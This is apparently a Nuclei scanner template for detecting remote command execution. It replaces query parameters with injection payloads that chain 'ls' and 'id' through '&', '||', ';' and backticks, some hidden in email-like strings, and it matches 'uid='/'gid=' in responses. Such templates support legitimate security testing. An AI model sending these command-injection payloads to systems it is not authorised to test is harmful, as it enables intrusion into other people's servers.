http:
- fuzzing:
  - fuzz:
    - '{{rce}}'
    mode: multiple
    part: query
    type: replace
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - uid=
    - gid=
  method: GET
  path:
  - '{{BaseURL}}'
  payloads:
    rce:
    - '%26ls||id%26'
    - '`ls||id`'
    - '%26ls%7C%7Cid%26'
    - '%26%26ls%7C%7Cid%26%26'
    - '%7C%7Cls%7C%7Cid%7C%7C'
    - '%3B%7C%7Cls%7C%7Cid%7C%7C'
    - '{`id`}@foo.com'
    - '}{`id`}@foo.com{'
    - '}}{`id`}@foo.com{{'
  stop-at-first-match: true
id: simple-fuzzing-rce
info:
  author: reewardius
  name: RCE
  severity: critical
  tags: fuzzing-rce,fuzzing-req,dast
